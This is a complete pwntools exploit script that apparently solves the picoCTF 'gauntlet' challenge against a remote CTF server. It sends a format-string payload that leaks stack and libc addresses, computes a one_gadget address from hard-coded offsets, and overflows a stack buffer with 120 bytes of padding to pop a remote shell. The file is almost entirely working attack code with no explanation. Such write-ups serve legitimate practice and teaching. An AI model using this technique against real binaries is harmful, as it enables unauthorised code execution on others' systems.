#!/usr/bin/env python3
from pwn import *

PORT =  57203
HOST = "wily-courier.picoctf.net"
e = context.binary = ELF('./gauntlet_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*0x4006d5
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return e.process()

p = conn()

p.sendline(b"%6$p|%23$p|")

dest = int(p.recvuntil("|", drop = True), 16) - 0x158
libc_leak = int(p.recvuntil("|", drop = True), 16) - 0x21c87

log.info("libc_leak: " + hex(libc_leak))
log.info("dest: " + hex(dest))

og = libc_leak + 0x4f302

p.sendline(b'A'*120 + p64(og))

p.interactive()